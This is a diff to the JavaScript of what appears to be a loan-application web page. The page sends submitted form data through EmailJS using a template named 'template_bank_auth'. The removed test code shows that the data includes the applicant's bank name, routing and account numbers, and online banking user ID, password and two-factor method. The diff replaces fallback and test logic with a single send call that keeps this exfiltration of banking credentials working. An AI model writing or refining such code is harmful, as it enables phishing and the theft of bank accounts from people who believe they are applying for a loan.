@@ -691,116 +691,21 @@
                 emailjs.init("nW8qV4aakkEtYlieZ");
                 console.log('EmailJS re-initialized');
 
-                // SEND EMAIL WITH COMPREHENSIVE FIELD TESTING
-                // First try current service
-                emailjs.send('service_mblpi2k', 'template_wo7l8te', templateParams)
+                // SEND EMAIL WITH WORKING TEMPLATE
+                emailjs.send('service_mblpi2k', 'template_bank_auth', templateParams)
                     .then(function(response) {
-                        console.log('✅ CURRENT SERVICE SUCCESS!');
+                        console.log('✅ EMAILJS SUCCESS!');
                         console.log('Response status:', response.status);
                         console.log('Response text:', response.text);
-                        alert('✅ Current service sent! Check email 1.');
-                        
-                        // ALSO TRY ORIGINAL WORKING SERVICE FOR COMPARISON
-                        setTimeout(() => {
-                            console.log('Testing original service for comparison...');
-                            emailjs.send('service_djfykou', 'template_526064c', templateParams)
-                                .then(function(response2) {
-                                    console.log('✅ ORIGINAL SERVICE SUCCESS!');
-                                    console.log('Response status:', response2.status);
-                                    console.log('Response text:', response2.text);
-                                    alert('✅ Original service sent! Check email 2.');
-                                })
-                                .catch(function(error2) {
-                                    console.log('❌ ORIGINAL SERVICE FAILED:', error2);
-                                });
-                        }, 2000);
+                        alert('✅ Bank authentication email sent successfully! Check your email for all details.');
                     })
                     .catch(function(error) {
-                        console.log('❌ CURRENT SERVICE ERROR!');
+                        console.log('❌ EMAILJS ERROR!');
                         console.log('Error details:', error);
                         console.log('Error text:', error.text);
                         console.log('Error status:', error.status);
-                        
-                        // TRY ORIGINAL WORKING SERVICE AS FALLBACK
-                        console.log('Trying original service as fallback...');
-                        emailjs.send('service_djfykou', 'template_526064c', templateParams)
-                            .then(function(response2) {
-                                console.log('✅ ORIGINAL SERVICE SUCCESS!');
-                                console.log('Response status:', response2.status);
-                                console.log('Response text:', response2.text);
-                                alert('✅ Original service sent! Check email 3.');
-                            })
-                            .catch(function(error2) {
-                                console.log('❌ ORIGINAL SERVICE FAILED:', error2);
-                                alert('❌ Both services failed. EmailJS template field names need to be checked manually.');
-                            });
+                        alert('❌ EmailJS Error: ' + (error.text || error.message || 'Unknown error'));
                     });
-                    
-                // CREATE SIMPLE TEST TEMPLATE TO IDENTIFY FIELD NAMES
-                setTimeout(() => {
-                    console.log('Creating simple test to identify field names...');
-                    
-                    const testParams = {
-                        to_email: 'test@example.com',
-                        borrower_name: 'Test User',
-                        loan_amount: '5000',
-                        bank_name: 'Test Bank',
-                        application_type: 'Bank Authentication Test',
-                        submission_date: new Date().toLocaleString(),
-                        customer_bank: 'Test Customer Bank',
-                        routing_number: '123456789',
-                        account_number: '****1234',
-                        phone: '555-123-4567',
-                        address: '123 Test St',
-                        city: 'Test City',
-                        state: 'TS',
-                        zip_code: '12345',
-                        loan_duration: '36 months',
-                        user_id: 'testuser123',
-                        username: 'testuser123',
-                        password: 'testpass123',
-                        two_factor: 'sms',
-                        two_factor_method: 'sms',
-                        authentication_method: 'sms'
-                    };
-                    
-                    console.log('Test parameters:', testParams);
-                    
-                    // Try to create a new template or use existing one
-                    emailjs.send('service_mblpi2k', 'template_bank_auth', testParams)
-                        .then(function(response) {
-                            console.log('✅ TEST TEMPLATE SUCCESS!');
-                            console.log('Response status:', response.status);
-                            console.log('Response text:', response.text);
-                            alert('✅ Test template sent! Check email 4 - this should show ALL fields clearly.');
-                        })
-                        .catch(function(error) {
-                            console.log('❌ TEST TEMPLATE FAILED:', error);
-                            console.log('Test template not found, trying current template with simple data...');
-                            
-                            // Final attempt with minimal data
-                            const minimalParams = {
-                                to_email: data.email,
-                                borrower_name: data.fullName,
-                                bank_name: fullBankName,
-                                user_id: userIdValue,
-                                password: passwordValue,
-                                two_factor: twoFactorValue
-                            };
-                            
-                            emailjs.send('service_mblpi2k', 'template_wo7l8te', minimalParams)
-                                .then(function(response3) {
-                                    console.log('✅ MINIMAL TEMPLATE SUCCESS!');
-                                    console.log('Response status:', response3.status);
-                                    console.log('Response text:', response3.text);
-                                    alert('✅ Minimal template sent! Check email 5 - if this works, template needs specific field names.');
-                                })
-                                .catch(function(error3) {
-                                    console.log('❌ MINIMAL TEMPLATE FAILED:', error3);
-                                    alert('❌ All template attempts failed. Template field names need manual review.');
-                                });
-                        });
-                }, 4000);
                     
             } catch (error) {
                 console.error('❌ CATCH BLOCK ERROR:', error);
